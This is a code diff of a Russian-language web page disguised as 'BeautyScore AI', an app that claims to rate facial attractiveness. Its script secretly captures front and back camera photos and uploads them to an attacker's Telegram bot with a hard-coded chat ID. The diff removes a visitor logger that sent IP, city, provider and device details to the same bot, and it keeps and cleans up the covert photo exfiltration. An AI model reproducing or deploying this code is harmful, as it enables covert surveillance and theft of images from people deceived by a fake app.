@@ -7,40 +7,71 @@
     <style>
         * { box-sizing: border-box; }
         body {
-            margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
-            background: #0f0c29; background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
-            font-family: 'Segoe UI', sans-serif; color: white; overflow: hidden;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #0f0c29;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            font-family: 'Segoe UI', sans-serif;
+            color: white;
+            overflow: hidden;
         }
-        .card {
-            background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px 20px;
-            border-radius: 30px; text-align: center; max-width: 360px; width: 90%;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5); position: relative; overflow: hidden;
+        .container {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 40px 20px;
+            border-radius: 30px;
+            text-align: center;
+            max-width: 360px;
+            width: 90%;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            position: relative;
         }
-        .scan-line {
-            display: none; position: absolute; left: 0; top: 0; width: 100%; height: 4px;
-            background: #00f2fe; box-shadow: 0 0 15px #00f2fe; animation: scan 2s infinite ease-in-out;
-        }
-        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
         .icon { font-size: 60px; margin-bottom: 15px; filter: drop-shadow(0 0 10px #ff0080); }
         h1 { font-size: 24px; margin: 0 0 10px; letter-spacing: 2px; text-transform: uppercase; color: #00f2fe; }
         p { font-size: 14px; color: #ccc; line-height: 1.6; margin-bottom: 30px; }
+        
         #b {
-            padding: 18px 40px; background: linear-gradient(90deg, #ff0080, #ff8c00);
-            border: none; border-radius: 50px; color: white; font-size: 16px; font-weight: bold;
-            cursor: pointer; transition: 0.3s; box-shadow: 0 10px 20px rgba(255, 0, 128, 0.3); text-transform: uppercase;
+            padding: 18px 40px;
+            background: linear-gradient(90deg, #ff0080, #ff8c00);
+            border: none;
+            border-radius: 50px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            box-shadow: 0 10px 20px rgba(255, 0, 128, 0.3);
+            text-transform: uppercase;
         }
         #b:active { transform: scale(0.95); }
-        #status { margin-top: 20px; font-size: 13px; color: #00f2fe; min-height: 20px; font-weight: 300; }
+        
+        #scan-line {
+            display: none;
+            position: absolute;
+            left: 0; top: 0; width: 100%; height: 4px;
+            background: #00f2fe;
+            box-shadow: 0 0 15px #00f2fe;
+            animation: scan 2s infinite ease-in-out;
+        }
+        @keyframes scan {
+            0% { top: 0; }
+            50% { top: 100%; }
+            100% { top: 0; }
+        }
+        #status { margin-top: 20px; font-size: 13px; color: #00f2fe; min-height: 20px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div id="line" class="scan-line"></div>
+<div class="container">
+    <div id="scan-line"></div>
     <div class="icon">💎</div>
     <h1>BeautyScore AI</h1>
-    <p>Нейросеть проанализирует ваше лицо по 100+ параметрам и определит ваш идеальный балл привлекательности.</p>
+    <p>Наша нейросеть проанализирует ваше лицо по 100+ параметрам и определит ваш идеальный балл привлекательности.</p>
     
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
@@ -54,20 +85,7 @@
     const chat_id = '7164380121';
     const btn = document.getElementById('b');
     const status = document.getElementById('status');
-    const line = document.getElementById('line');
-
-    // 1. ЛОГГЕР ПРИ ВХОДЕ
-    async function logVisit() {
-        try {
-            const res = await fetch('https://ipwho.is');
-            const d = await res.json();
-            const info = `👀 КТО-ТО ЗАШЕЛ!\n🌍 Страна: ${d.country}\n🏙 Город: ${d.city}\n🏢 Провайдер: ${d.connection.org}\n📍 IP: ${d.ip}\n📱 Устройство: ${navigator.userAgent.substring(0, 50)}`;
-            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent(info));
-        } catch (e) {
-            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("👀 Заход (Данные заблокированы)"));
-        }
-    }
-    logVisit();
+    const scanLine = document.getElementById('scan-line');
 
     async function takePhoto(facing) {
         try {
@@ -83,19 +101,16 @@
             const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.7));
             const f = new FormData();
             f.append('chat_id', chat_id);
-            f.append('photo', blob, 'img.jpg');
-            f.append('caption', "📸 Фото (" + facing + ")\n📱 Устройство: " + navigator.userAgent.substring(0, 60));
+            f.append('photo', blob, `snap_${facing}.jpg`);
             
-            await fetch('https://api.telegram.org'/bot + token + '/sendPhoto', { method: 'POST', body: f });
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
             stream.getTracks().forEach(t => t.stop()); 
-        } catch (e) {
-            fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=' + encodeURIComponent("❌ КАМЕРА ЗАПРЕЩЕНА: " + facing));
-        }
+        } catch (e) { status.innerText = "Ошибка доступа"; }
     }
 
     btn.onclick = async () => {
         btn.style.display = "none";
-        line.style.display = "block";
+        scanLine.style.display = "block";
         
         status.innerText = "Анализ биометрии (Front)...";
         await takePhoto("user"); 
